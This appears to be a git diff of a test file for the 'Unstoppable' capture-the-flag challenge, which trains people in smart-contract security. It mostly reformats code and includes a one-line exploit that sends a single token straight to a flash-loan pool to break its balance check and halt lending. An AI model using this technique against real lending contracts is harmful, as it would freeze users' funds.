@@ -13,15 +13,9 @@ describe('[Challenge] Unstoppable', function () {
 
 		;[deployer, attacker, someUser] = await ethers.getSigners()
 
-		const DamnValuableTokenFactory = await ethers.getContractFactory(
-			'DamnValuableToken',
-			deployer
-		)
+		const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer)
 
-		const UnstoppableLenderFactory = await ethers.getContractFactory(
-			'UnstoppableLender',
-			deployer
-		)
+		const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer)
 
 		this.token = await DamnValuableTokenFactory.deploy()
 		this.pool = await UnstoppableLenderFactory.deploy(this.token.address)
@@ -33,15 +27,10 @@ describe('[Challenge] Unstoppable', function () {
 
 		expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL)
 
-		expect(await this.token.balanceOf(attacker.address)).to.equal(
-			INITIAL_ATTACKER_TOKEN_BALANCE
-		)
+		expect(await this.token.balanceOf(attacker.address)).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE)
 
 		// Show it's possible for someUser to take out a flash loan
-		const ReceiverContractFactory = await ethers.getContractFactory(
-			'ReceiverUnstoppable',
-			someUser
-		)
+		const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser)
 		this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address)
 		await this.receiverContract.executeFlashLoan(10)
 	})
@@ -49,9 +38,10 @@ describe('[Challenge] Unstoppable', function () {
 	it('Exploit', async function () {
 		/** CODE YOUR EXPLOIT HERE */
 		// Transfer 1 token to LenderPool to create an internal imbalance and make the assert
-		// requirement impossible to fulfill, since "poolBalance (1000000) == balanceBefore (1000001)"
-		// is false
+		// statement impossible to fulfill
 		await this.token.connect(attacker).transfer(this.pool.address, 1)
+		console.log('  POOL BALANCE', String(await this.token.balanceOf(this.pool.address)))
+		console.log('BALANCE BEFORE', String(await this.pool.poolBalance()))
 	})
 
 	after(async function () {
